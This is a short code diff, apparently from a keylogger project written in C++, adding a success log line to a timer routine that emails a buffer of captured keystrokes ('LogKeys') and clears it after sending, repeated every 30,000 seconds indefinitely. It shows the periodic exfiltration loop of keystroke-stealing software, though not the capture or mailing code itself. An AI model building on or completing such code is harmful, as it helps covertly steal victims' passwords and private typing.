@@ -28,7 +28,10 @@ void MailTimer()
 	if (mailing != 7)
 		KeyLogger::ErrorLogger("Mail sending has failed with error : " + KeyLogger::ToString(mailing));
 	else
+	{
+		KeyLogger::InfoLogger("Successfully sent mail");
 		LogKeys = "";
+	}
 }
 
 Timer SetMailTimer(MailTimer, 500 * 60, Timer::Infinite);
